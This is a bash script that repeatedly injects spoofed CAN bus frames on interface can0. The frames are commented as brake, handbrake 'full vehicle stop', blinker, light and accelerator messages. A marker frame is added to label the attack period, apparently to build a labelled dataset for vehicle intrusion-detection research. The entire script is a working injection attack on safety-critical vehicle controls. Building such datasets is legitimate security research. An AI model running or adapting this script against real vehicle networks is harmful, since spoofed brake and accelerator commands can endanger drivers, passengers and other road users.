#!/bin/bash

# Automated multiple attacks with marker frames for attack labeling dataset generation
trap "cansend can0 010#01; echo 'Marker frame sent'; exit" SIGINT

count=0
while true; do
    # Send marker frame to indicate attack for data labeling
    while [[ $count -lt 1 ]]; do
        cansend can0 010#01
        sleep 0.1
        count=$((count + 1))
    done
    # Brakes 
    cansend can0 024#FFFF606060606060 # Normal brake message
    sleep 0.1
    cansend can0 1d3#01008A743AC9B735 # Handbrake message to ensure full vehicle stop
    sleep 0.1
    # Blinkers
    cansend can0 1A7#00014A5789747292 # Left blinker, first byte 01
    sleep 0.1
    cansend can0 1A7#01004A5789747392 # Right blinker, second byte 01
    sleep 0.1
    # Lights
    cansend can0 150#02
    sleep 0.1
    cansend can0 150#03
    sleep 0.1
    cansend can0 150#04
    sleep 0.1
    # Accelerator
    cansend can0 039#0FBFC100B6789000
    sleep 0.1
done